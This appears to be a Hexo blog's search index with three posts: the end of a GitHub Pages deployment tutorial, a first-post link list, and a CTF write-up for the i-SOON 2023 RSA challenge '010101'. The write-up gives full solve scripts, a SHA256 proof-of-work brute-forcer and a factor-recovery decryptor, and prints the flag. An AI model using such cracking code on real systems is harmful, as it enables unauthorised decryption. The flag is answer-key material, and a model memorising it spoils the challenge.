<li>在github上新建一个仓库，必须以<code>username.github.io</code>命名，例如本站的仓库名为<code>yumlii33.github.io</code></li>
<li>修改博客根目录下的<code>_config.yml</code>文件，修改<code>deploy</code>配置，例如本站的配置如下：  <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">repo:</span> <span class="string">git@github.com:yumlii33/yumlii33.github.io.git</span></span><br><span class="line"><span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure></li>
<li>安装上传插件，执行<code>npm install hexo-deployer-git --save</code></li>
<li>执行<code>hexo clean</code>，清除缓存</li>
<li>执行<code>hexo g</code>，生成静态文件</li>
<li>执行<code>hexo d</code>，部署到github</li>
<li>访问<code>https://username.github.io</code>，显示博客，则部署成功</li>
</ul>
<h2 id="源码上传到github"><a href="#源码上传到github" class="headerlink" title="源码上传到github"></a>源码上传到github</h2><ul>
<li>在本地hexo根目录下执行<code>git init</code>，初始化git仓库</li>
<li>执行<code>git remote add origin git@github.com:username/username.github.io.git</code>，添加远程仓库</li>
<li>创建<code>.gitignore</code>文件，添加忽略文件，例如本站的配置如下：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure></li>
<li>执行<code>git add .</code>，添加所有文件到暂存区</li>
<li>执行<code>git commit -m &quot;init&quot;</code>，提交到本地仓库</li>
<li>执行<code>git push -u origin master</code>，上传到远程仓库主分支</li>
</ul>
<h2 id="新环境部署"><a href="#新环境部署" class="headerlink" title="新环境部署"></a>新环境部署</h2><ul>
<li>在新环境下，执行<code>git clone</code>，克隆仓库到本地</li>
<li>执行<code>npm install</code>，安装项目依赖</li>
<li>执行<code>hexo s</code>，启动本地服务，打开浏览器，输入<code>http://localhost:4000</code>，显示博客，则部署成功</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.cnblogs.com/huanhao/p/hexobase.html">【基础篇】hexo博客搭建教程 - huanhao - 博客园</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/71544809">使用git分支保存hexo博客源码到github - 知乎</a></li>
</ul>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-第六届安洵杯网络安全挑战赛-010101</title>
    <url>/2024/01/07/WriteUp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-010101/</url>
    <content><![CDATA[<h2 id="赛事名称"><a href="#赛事名称" class="headerlink" title="赛事名称"></a>赛事名称</h2><p>i-SOON_CTF_2023<br>第六届安洵杯网络安全挑战赛   </p>
<h2 id="赛事描述"><a href="#赛事描述" class="headerlink" title="赛事描述"></a>赛事描述</h2><p><a href="https://dce.i-soon.net/#/examineDetails">https://dce.i-soon.net/#/examineDetails</a></p>
<h2 id="赛事网址"><a href="#赛事网址" class="headerlink" title="赛事网址"></a>赛事网址</h2><p><a href="https://dce.i-soon.net/#/examineDetails">https://dce.i-soon.net/#/examineDetails</a></p>
<h2 id="010101"><a href="#010101" class="headerlink" title="010101"></a>010101</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes, getStrongPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;D0g3&#123;******************************************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyServer</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()</span><br><span class="line">        self.request.sendall((<span class="string">&#x27;SHA256(XXXX + %s):%s\n&#x27;</span> % (random_str[<span class="number">4</span>:], str_sha256)).encode())</span><br><span class="line">        self.request.sendall(<span class="string">&#x27;Give Me XXXX:\n&#x27;</span>.encode())</span><br><span class="line">        XXXX = self.request.recv(<span class="number">2048</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((XXXX + random_str[<span class="number">4</span>:].encode())).hexdigest() != str_sha256:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPQN</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = getStrongPrime(<span class="number">2048</span>)</span><br><span class="line">            q = getStrongPrime(<span class="number">2048</span>)</span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">if</span> p.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> n.bit_length() == <span class="number">4096</span>:</span><br><span class="line">                <span class="keyword">return</span> p, q, n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        p, q, n = self.getPQN()</span><br><span class="line">        m = bytes_to_long(flag)</span><br><span class="line">        e = <span class="number">0x10001</span></span><br><span class="line">        c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">        p = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">        p1 = <span class="built_in">list</span>(p[:<span class="number">1024</span>])</span><br><span class="line">        p2 = <span class="built_in">list</span>(p[<span class="number">1024</span>:])</span><br><span class="line">        p1[random.choice([i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(p1) <span class="keyword">if</span> c == <span class="string">&#x27;1&#x27;</span>])] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        p2[random.choice([i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(p1) <span class="keyword">if</span> c == <span class="string">&#x27;0&#x27;</span>])] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> n, <span class="string">&#x27;&#x27;</span>.join(p1) + <span class="string">&#x27;&#x27;</span>.join(p2), c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof():</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;Error Hash!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        n, p, c = self.encrypt()</span><br><span class="line">        self.request.sendall(<span class="string">&#x27;Press 1 to get ciphertext\n&#x27;</span>.encode())</span><br><span class="line">        number = self.request.recv(<span class="number">512</span>).strip().decode()</span><br><span class="line">        <span class="keyword">if</span> number == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            self.request.sendall((<span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">            self.request.sendall((<span class="built_in">str</span>(p) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">            self.request.sendall((<span class="built_in">str</span>(c) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.request.sendall(<span class="string">&#x27;Incorrect input!\n&#x27;</span>.encode())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sever = socketserver.ThreadingTCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span>), MyServer)</span><br><span class="line">    ThreadedTCPServer.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    ThreadedTCPServer.allow_reuse_port = <span class="literal">True</span></span><br><span class="line">    sever.serve_forever()</span><br></pre></td></tr></table></figure>

<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
<li><code>crypto</code></li>
<li><code>SHA256</code></li>
<li><code>RSA</code></li>
</ul>
<h3 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h3><ul>
<li>分析代码逻辑：<ul>
<li><code>proof</code>：<ul>
<li>随机生成一个字符串<code>random_str</code></li>
<li>计算字符串的哈希值<code>str_sha256</code></li>
<li>给出<code>random_str[4:]</code>和<code>str_sha256</code>，让用户计算<code>random_str[:4]</code></li>
<li>如果用户给定的<code>random_str[:4]</code>和<code>random_str[4:]</code>的哈希值相同，则验证通过</li>
</ul>
</li>
<li><code>getPQN</code>：<ul>
<li>随机生成两个大素数<code>p</code>和<code>q</code>，满足以下要求：<code>p.bit_length() == 2048 and q.bit_length() == 2048 and (p*q).bit_length() == 4096</code></li>
<li><code>return p, q, n</code></li>
</ul>
</li>
<li><code>encrypt</code>：<ul>
<li>通过<code>getPQN</code>生成<code>p</code>和<code>q</code>和<code>n</code></li>
<li>计算密文<code>c = pow(m, e, n)</code></li>
<li>对<code>p</code>进行变换：前1024位随机挑选一个1变成0，后1024位随机挑选一位变成1，得到<code>fake_p</code></li>
<li><code>return n, fake_p, c</code></li>
</ul>
</li>
<li><code>handle</code>：   <ul>
<li>通过<code>proof</code>函数判断用户输入的<code>XXXX</code>和<code>random_str[4:]</code>的哈希值是否相同         </li>
<li>相同的话，通过<code>encrypt</code>函数对<code>flag</code>进行加密，返回<code>n, fake_p, c</code></li>
</ul>
</li>
</ul>
</li>
<li>解题步骤：<ul>
<li><code>nc</code>连入服务器，获取<code>random_str[4:]</code>和<code>str_sha256</code><br><img src="/project/.io//2024/01/07/WriteUp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-010101/nc%E8%BF%9E%E6%8E%A5%E5%9B%9E%E6%98%BE.png"></li>
<li>通过<code>getXXXX.py</code>爆破<code>random_str[:4]</code>，并将结果发送给服务器，获得<code>n，fake_p，c</code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;5ccd4cda1dc33d20a072cddf2cf921c865b274da912edb7ac3f157404c3fe4e3&quot;</span></span><br><span class="line">tail=<span class="string">&quot;uLBLoFfDko5h5uA9&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure></li>
<li>基于<code>encrypt</code>函数，编写<a href="./files/decrypt.py"><code>decrypt.py</code></a>脚本，破解<code>p</code>，解密得到<code>flag</code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">909467367699122020071016988650306999295228108976638769699035391871165765547800730173871546690865275123375066230171521311068819816852640125745292539541259006023609504769135551654529045891894185101263480691408339167146959806826342796151867522273018753414683125578415962666829770904166690498846087399777025030862122796483743577214854248422262763202974262015130017066825754008160259189414818697567284326444565265735329976239935592453543076795651573576794776003238789860869381589213987112412732442793109900427324085928201408085720252507826509949584097216821241278182597257299885172782505117521436358744947983811939554943145617958259867137670519879871430621545154465019553001205911580515698810275961361004704605451591223643427530911392689056988136336912424730785373902092658701108834786609423741166892942322112744091173801215997979197781791157780385712374075574951133435122784372704793303399699730638707098947178219189508884581830248871075957102690166621382729933821529281361101591281902812061185346676660877303782149165897420682724683205662866974137418732285231256810541807361468193401184858075051706155601176563558866315093106261534227649361408522136583934234512184301782185760219449297423394506961283209453334215176208906015567865682661</span></span><br><span class="line">fake_p=<span class="string">&#x27;11100000100010111111010011100000110011001000001001111011001010011100001101000000001010000010101000011110000001000000010111000110101000101101011101111010001110110000000001101110100011101001100011101010110011111001001011101000110100011011101011110110001111100110101000010110110001001110001101111111100001101101110010011110100101110001101101101011011100111110101111000111000010011101001000011110000101111000010110000001100001111001011100011001110110110110000110000110111010111101110111100100111101111001100110010000000110011011111011111100000010010111111000010110010000110000111100011001111010101000111110011110001010101010010100001010100110111111101010010000000100101011001011100100111111001000111011111010101011111111010011101110111111110011101111001000011011000000000011100101101000001101110101100001110000110101011001000010110110000110110001101010110001100010110010110000000001110001101111011100011011110101010010011010100011010100010101100000010111100000101100010110000100001001101001001001111011011000101010001011010001100101110111111100111111001011100001100001011101011000000001101111011011001001100100111101100100111100100000000111110100011100011110001101100000100000101001101100010100000110111010001111011010110100101010101100000000001111001111010100011000010010010001010011100111100001101100111100010101111101011001100011111011000011101111110101110010100011000111010100000000111110111001111110100011100100111101001101011010110001100000101010001111000110100110101110001011100010011100111110111111010001110111000001000010111110100000110110110010111101101111010010110100011110110011011010010000000000101110101001001111100110111111001000000101101011111011110110111111001101001111011100110101101010101100000010100111101110110101101010100110011010011101101000010011101011001011110001011110011000101110000100000110100011101001100101110000001110100111010110110000101000011011010011100101101011010010010100110011011100001110001000000111101111000001010110111111010110101111000100111111111111101111001110101101111111101111011011101111111000100000110111&#x27;</span></span><br><span class="line">c=<span class="number">694500789519839583373480124753870609796624184368847740052659890684952282469412685843793893336588959688292535565388961237054382061607809034620598317779687541764120119851622500197513641485700221545824097256986828990721130988465432457926804939623885349284941907683524562179105951076405178191916974212394857571647273209891325684133975190612454243345915122493599006273649156588911638621279271660577286076492174133379924878816759449537816258877983535822071467357826352013991371273144147958254806851665648862909470014188217381547444474766611515043375595448634817257201321537710925281810846187991415244304258902323932755496219900194257710795367213151869032406828586461628113793387618900293473170817978068346842472541499877290335671510770413540109295368927586613167172537907784632075379648806105818669008103026164730513033786875076959900405998112656279798642754984874654321483935047414576483030634418889375971016788408747123075626184286939742532706576269950026208168650867226593584227608482405783125152467929531339747039920420671850985997912834217484356948372454631601487864570640693252550030654681522447089126289751692094672022733644147229926742656125552935762042624836326359406490008032106080800094693108856102201450516929541344003829402493</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_p1=<span class="built_in">list</span>(fake_p[:<span class="number">1024</span>])</span><br><span class="line">fake_p2=<span class="built_in">list</span>(fake_p[<span class="number">1024</span>:])</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(fake_p1):</span><br><span class="line">    <span class="keyword">if</span> x == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        p1=fake_p1[:i]+[<span class="string">&#x27;1&#x27;</span>]+fake_p1[i+<span class="number">1</span>:]</span><br><span class="line">        p2=fake_p2</span><br><span class="line">        p=<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(p1)+<span class="string">&#x27;&#x27;</span>.join(p2),<span class="number">2</span>)   </span><br><span class="line">        <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">            q=n//p</span><br><span class="line">            <span class="keyword">if</span> p.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> n.bit_length() == <span class="number">4096</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Get p q!\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;bad format1!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:         </span><br><span class="line">            <span class="keyword">for</span> j,y <span class="keyword">in</span> <span class="built_in">enumerate</span>(fake_p2):</span><br><span class="line">                <span class="keyword">if</span> y== <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    p2=fake_p2[:j]+[<span class="string">&#x27;0&#x27;</span>]+fake_p2[j+<span class="number">1</span>:]</span><br><span class="line">                    p=<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(p1)+<span class="string">&#x27;&#x27;</span>.join(p2),<span class="number">2</span>)   </span><br><span class="line">                    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">                        q=n//p</span><br><span class="line">                        <span class="keyword">if</span> p.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> n.bit_length() == <span class="number">4096</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;Get p q!\n&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;bad format2!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;phi_n:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(phi_n)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D0g3&#123;sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>my-first-blog</title>
    <url>/2024/01/03/my-first-blog/</url>
    <content><![CDATA[<h2 id="My-First-Blog"><a href="#My-First-Blog" class="headerlink" title="My First Blog"></a>My First Blog</h2><p>这是我的第一篇博客，记录一下使用hexo+githubpages搭建个人网站时有用的参考链接~ b(￣▽￣)d</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul>
<li><a href="https://www.cnblogs.com/huanhao/p/hexobase.html">【基础篇】hexo博客搭建教程 - huanhao - 博客园</a></li>
<li><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客</a></li>
<li><a href="https://oytoyt.github.io/2018/12/06/hexo%E5%BC%80%E5%90%AFtags%E6%88%96categories%E5%85%B6%E5%AE%83%E8%8F%9C%E5%8D%95%E6%97%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98/">hexo开启tags或categories其它菜单时，无法访问问题 | Yanting Ou</a></li>
</ul>
<h2 id="TODO："><a href="#TODO：" class="headerlink" title="TODO："></a>TODO：</h2><ul>
<li>hexo博文中添加图片，修改hexo-asset-image插件配置</li>
</ul>
]]></content>
  </entry>
</search>
